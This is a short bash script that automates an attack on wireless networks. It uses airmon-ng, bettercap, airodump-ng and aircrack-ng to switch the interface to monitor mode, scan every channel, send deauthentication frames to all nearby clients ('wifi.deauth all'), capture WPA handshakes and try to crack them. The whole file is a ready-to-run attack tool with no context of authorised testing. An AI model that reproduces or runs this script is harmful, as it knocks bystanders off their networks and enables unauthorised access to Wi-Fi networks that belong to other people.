#!/bin/bash

echo "[1] Configuring wlan0 interface..."
sudo systemctl stop NetworkManager
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
sudo airmon-ng check kill
sudo airmon-ng start wlan0

echo "[2] Scanning Wi-Fi networks (10 sec)..."
{
    echo "wifi.recon on"
    echo "set wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12"
    sleep 10
    echo "wifi.show"
    echo "quit"
} | bettercap -iface wlan0

echo "[3] Starting deauthentication attack (15 sec)..."
{
    echo "wifi.recon on"
    echo "wifi.deauth all"
    sleep 15
    echo "quit"
} | bettercap -iface wlan0

CAPTURE_FILE="handshake"
echo "[4] Capturing handshake to file ${CAPTURE_FILE}.cap..."
sudo airodump-ng -w "$CAPTURE_FILE" --output-format pcap wlan0 &
AIRODUMP_PID=$!
sleep 10
sudo kill $AIRODUMP_PID

echo "[5] Analyzing captured handshake..."
if [[ -f "${CAPTURE_FILE}-01.cap" ]]; then
    aircrack-ng "${CAPTURE_FILE}-01.cap"
else
    echo "Error: handshake file not found. Try again."
fi

echo "[6] Cleaning up..."
sudo airmon-ng stop wlan0
sudo systemctl start NetworkManager
echo "Done."
